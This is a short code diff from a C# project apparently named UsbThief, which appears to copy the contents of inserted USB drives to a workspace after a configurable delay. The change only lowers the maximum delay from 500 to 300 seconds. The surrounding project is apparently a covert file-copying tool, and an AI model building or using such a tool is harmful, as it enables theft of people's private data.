@@ -293,7 +293,7 @@ namespace UsbThief
                                         if (drive.VolumeLabel != conf.exportVol)
                                         {
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
-                                            if (conf.delay > 0 && conf.delay <= 500)
+                                            if (conf.delay > 0 && conf.delay <= 300)
                                             {
                                                 logger.Info("复制将于" + conf.delay + "秒后开始");
                                                 Delay(conf.delay * 1000);
